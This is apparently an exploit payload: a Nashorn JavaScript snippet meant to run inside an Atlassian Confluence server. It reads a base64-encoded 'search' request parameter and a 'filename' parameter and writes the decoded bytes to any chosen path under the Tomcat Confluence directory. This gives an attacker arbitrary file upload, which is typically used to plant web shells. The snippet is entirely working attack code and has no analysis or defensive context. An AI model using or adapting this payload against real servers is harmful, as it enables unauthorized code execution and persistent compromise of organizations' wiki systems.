load("nashorn:mozilla_compat.js");
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var request = com.opensymphony.webwork.ServletActionContext.getRequest();
var payload = request.getParameter("search");
var filename = request.getParameter("filename");
var path = "confluence" + File.separator + filename;path = path.replace("/", File.separator);
var file = new File(System.getProperty("catalina.home") + File.separator + path);
var dir = file.getParentFile();
if(!dir.exists()){dir.mkdirs();}
var fos = new FileOutputStream(file);
var decodeContent = java.util.Base64.getDecoder().decode(payload);
fos.write(decodeContent, new Integer(0), new Integer(decodeContent.length));
fos.close();
"ok";